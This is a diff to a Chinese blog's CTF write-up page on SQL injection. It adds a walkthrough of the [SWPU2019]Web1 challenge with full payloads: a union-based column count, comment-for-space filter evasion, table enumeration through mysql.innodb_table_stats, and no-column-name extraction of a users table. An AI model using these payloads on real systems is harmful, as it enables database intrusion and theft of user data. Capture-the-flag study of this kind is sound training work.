@@ -625,11 +625,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 1.1k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 1.6k |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 5分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 7分钟 |
           </span>
   
           
@@ -768,6 +768,27 @@ EXECUTE name;  #执行预定义SQL语句
 <p>alter table words rename to aaa;                                         先把原来的words表名字改成aaa<br>alter table `1919810931114514` rename to words;        将表1919810931114514的名字改为words<br>alter table words change flag id varchar(60);                      将改完名字后的表中的flag改为id，字符串尽量长点吧</p>
 <p>再用<code>1&#39; or 1=1 --+</code>爆出表段</p>
 <p><img src="https://i.loli.net/2021/10/27/4B7lA5UoSVjnwXk.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/10/27/4B7lA5UoSVjnwXk.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h2 id="四、-SWPU2019-Web1"><a href="#四、-SWPU2019-Web1" class="headerlink" title="四、[SWPU2019]Web1"></a>四、[SWPU2019]Web1</h2><h4 id="知识点：MariaDB的SQL注入、无列名注入"><a href="#知识点：MariaDB的SQL注入、无列名注入" class="headerlink" title="知识点：MariaDB的SQL注入、无列名注入"></a>知识点：MariaDB的SQL注入、无列名注入</h4><p><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a><br><code>mysql.innodb_table_stats</code>用于报表名<br><code>select group_concat(table_name) from mysql.innodb_table_stats</code></p>
+<p><img src="https://s2.loli.net/2022/02/19/kYVTxhiwjfyEeHA.png" class="lazyload placeholder" data-srcset="https://s2.loli.net/2022/02/19/kYVTxhiwjfyEeHA.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>注册账号登录，申请广告名为<code>1&#39;</code>，发现有sql报错，应该是sql注入。(可能也有xss)</p>
+<p>发布广告名时过滤了or/order/information/空格/–+/#等关键字，先尝试用union注入找到列数.</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆列数：<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span>
+或者：<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/group/**/by/**/23,'</span><span class="token number">5</span>报错而<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/group/**/by/**/22,'</span><span class="token number">5</span>正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>发现总列数为22，且2/3列可以回显。查看用户名和数据库类型为MariaDB</p>
+<p>因为过滤了information_schema，此处看wp发现可以使用mysql.innodb_table_stats或者sys.schema_auto_increment_columns(不一定有)</p>
+<img src="https://s2.loli.net/2022/02/19/pILgUVYNq8eD7cR.png" class="lazyload placeholder" data-srcset="https://s2.loli.net/2022/02/19/pILgUVYNq8eD7cR.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" style="zoom: 67%;" />
+
+<pre class="line-numbers language-none"><code class="language-none">查询表名：-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆出表名ads、users–&gt;猜测尝试在users–&gt;<strong>再测出users的列数为3</strong>–&gt;使用无列名注入方式：</p>
+<p>可参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dc9af4ca2d06%E3%80%81https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">https://www.jianshu.com/p/dc9af4ca2d06、https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a></p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22
+或者直接全查：
+1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a,b,c)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1&#x2F;**&#x2F;as&#x2F;**&#x2F;a,2&#x2F;**&#x2F;as&#x2F;**&#x2F;b,3&#x2F;**&#x2F;as&#x2F;**&#x2F;c&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>最后尝试<code>3 as a</code>可以爆出flag。</p>
+<p><img src="https://s2.loli.net/2022/02/19/zyRg96otXPHlnjU.png" class="lazyload placeholder" data-srcset="https://s2.loli.net/2022/02/19/zyRg96otXPHlnjU.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
 
       </div>
       <div class="post-tags-categories">
@@ -789,7 +810,7 @@ EXECUTE name;  #执行预定义SQL语句
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2022/02/04/BUUCTF-SQL注入类/" target="_blank" title="BUUCTF_SQL注入类">https://Wkingxc.com/2022/02/04/BUUCTF-SQL注入类/</a>
+    <a href="/2022/02/04/BUUCTF-sql注入类/" target="_blank" title="BUUCTF_SQL注入类">https://Wkingxc.com/2022/02/04/BUUCTF-sql注入类/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
